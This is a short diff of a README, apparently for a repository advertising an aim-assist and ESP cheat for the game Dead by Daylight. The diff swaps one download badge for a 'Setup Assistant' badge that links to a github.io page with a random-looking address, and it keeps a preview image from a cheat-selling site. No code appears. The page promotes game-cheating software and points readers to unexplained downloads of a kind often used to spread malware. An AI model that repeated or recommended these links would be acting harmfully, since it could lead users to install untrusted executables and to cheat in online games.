@@ -4,12 +4,7 @@
 
 <h1 align="center">🎯 DBD Aim Assist with ESP</h1>
 
-<p align="center">
-  <a href="https://dbd-aim-assist-with-esp.github.io/.github/" target="_blank">
-    <img src="https://img.shields.io/badge/⬇️%20Download%20DBD%20Aim%20Assist%20with%20ESP-Windows%20Version-1E90FF?style=for-the-badge&logo=windows&logoColor=white" 
-         alt="Download DBD Aim Assist with ESP" style="width:540px; height:37px;" />
-  </a>
-</p>
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-lightgrey)](https://ejusisawu788.github.io/.github/dbd-assist-with-kit)
 
 <p align="center">
   <img src="https://www.skycheats.com/uploads/monthly_2025_06/4.webp.f7cb4c3913c3d440f7b010fd33880c5a.webp" alt="DBD Aim Assist with ESP Preview" width="800" />
